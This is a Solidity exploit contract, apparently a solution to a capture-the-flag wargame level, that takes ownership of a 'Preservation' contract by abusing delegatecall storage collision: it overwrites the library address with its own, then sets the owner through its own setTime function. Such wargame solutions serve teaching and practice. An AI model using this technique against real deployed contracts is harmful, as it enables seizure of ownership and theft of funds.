// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/Preservation/Preservation.sol";
import "lib/forge-std/src/test.sol";


contract PreservationExploit {


    // we set up the state variables to 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
    Preservation victim;

    constructor(address _victim) {
        victim = Preservation(_victim);
    }

    function hack() public {

        // this will set the timeZone1Libary to the address of this contract 
        victim.setFirstTime(uint(uint160(address(this))));
        // doesn't matter what we call this with, now this will call our setTime function via delegate call, and set the owner to this contract
        require(victim.timeZone1Library() == address(this), "timeZone1Library should be this contract");
        victim.setFirstTime(0);
    }

    function setTime(uint _time) public {
        // because this is called from delegatecall in Preservation.setFirstTime, which is called from this contract, and delegateCall preserves state variables, msg.sender will refer back to this contract
        owner = msg.sender;
    }

    receive() external payable {
    }
}
